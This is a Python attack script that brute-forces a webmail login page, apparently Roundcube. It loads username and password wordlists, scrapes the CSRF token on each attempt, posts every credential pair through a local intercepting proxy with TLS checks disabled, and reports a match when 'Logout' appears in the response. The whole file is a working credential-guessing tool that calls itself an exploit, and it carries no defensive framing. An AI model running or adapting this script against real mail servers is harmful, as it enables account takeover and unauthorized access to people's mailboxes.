import requests
import re
import sys
import urllib3
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import signal
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Proxies for Burp or Zap.
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
start = time.perf_counter()
usernames = []
passwords = []
finish = ""


def load_creds(un_file, pw_file):
    try:
        with open(un_file) as f: 
        #with open('/home/kali/Work/RC_IRM_TEST/password_lists/usernames.txt') as f: 
            # Save the lines into list
            for user in f:
                user = user.strip()
                usernames.append(user)
        
        with open(pw_file) as f:
        #with open('/home/kali/Work/RC_IRM_TEST/password_lists/passwords.txt') as f:
            for passwd in f:
                passwd = passwd.strip()
                passwords.append(passwd)
    except Exception as e:
        print('LOAD CREDS - Error Return Type: ', type(e))

def fuzzer(url, path_param, un_file, pw_file):
    index = 1
    sess = requests.Session()
    url_param = urljoin(url, urlparse(url).path) + path_param
    load_creds(un_file, pw_file)
    print(f"{len(passwords)} passwords to try on this run")
    print("-------------------------------------------------------")
    for user in usernames:
        for passwd in passwords:
            print(f"Attempt #{index}")
            print("USER: ", user)
            print("PASS: ", passwd)
            try:
                req_get = sess.get(url_param, verify=False, proxies=proxies)
                #print("REQUEST: ", req)
                # Check the HTML to see where to parse the CSRF from.
                beau_soup = BeautifulSoup(req_get.text, 'html.parser')
                #print("SOUP: ", beau_soup)
                # Find the _token input element and get its value.
                token = beau_soup.find("input", type="hidden", attrs={"name": "_token"})["value"]
                task = beau_soup.find("input", type="hidden", attrs={"name": "_task"})["value"]
                action = beau_soup.find("input", type="hidden", attrs={"name": "_action"})["value"]
                timezone = beau_soup.find("input", type="hidden", attrs={"name": "_timezone"})["value"]
                data = {
                    "_token": token, 
                    "_task": task, 
                    "_action": action, 
                    "_timezone": "America/New_York",
                    "_url": "_task=login",
                    "_user": user, 
                    "_pass": passwd
                }
                print(f"Login URL: {url_param}")
                cookie = sess.cookies.get_dict()
                for key, val in cookie.items():
                    print(f"Cookie: {key}={val}")
                print(f"Token: {data['_token']}")
                # Send a POST request and fuzz with credentials.
                req_post = sess.post(url_param, data=data, verify=False, proxies=proxies)
                soup = BeautifulSoup(req_post.text, 'html.parser')
                req_post = re.sub(r'[\[\]]', '', str(req_post))
                req_post = re.sub('[^A-z0-9 -]', '', str(req_post))
                print(f"{req_post}")
                # Get the HTML where the payload is injected into.
                response = soup.find_all('span', attrs={'class':'inner'})
                spans = [res.get_text() for res in response]
                #print(response)
                for span in spans:
                    if "Logout" in span:
                        print(f'"{span}" string found in HTML.')
                        print("Credentials found!")
                        print(f"{user}:{passwd}")
                        finish = time.perf_counter()
                        print(f"Finished in {round(finish-start, 2)} seconds.")
                        return
                finish = time.perf_counter()    
                print(f"Time passed: {round(finish-start, 2)} seconds.")    
                print("-------------------------------------------------------")
                #time.sleep(1)
                #sess = get_session()
                index = index + 1
            except Exception as e:
                print('FUZZER - Error Return Type: ', type(e))
    

def signal_handler(sig, frame):
    print("\n[+] Exploit aborted with Ctrl-c.")
    # Run any clean up commands here.
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)
 
if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        path_param = sys.argv[2].strip()
        un_file = sys.argv[3].strip()
        pw_file = sys.argv[4].strip()
    except IndexError:
        print("[-] Usage: python3 %s <url> <path_param> <un_file> <pw_file>" % sys.argv[0])
        print('[-] Example: python3 %s "https://domain.com/mail" "/?_task=login" usernames.txt passwords.txt' % sys.argv[0])
        sys.exit(-1)

    if url:
        fuzzer(url, path_param, un_file, pw_file)
    else:
        print("[-] The session was not successful...")
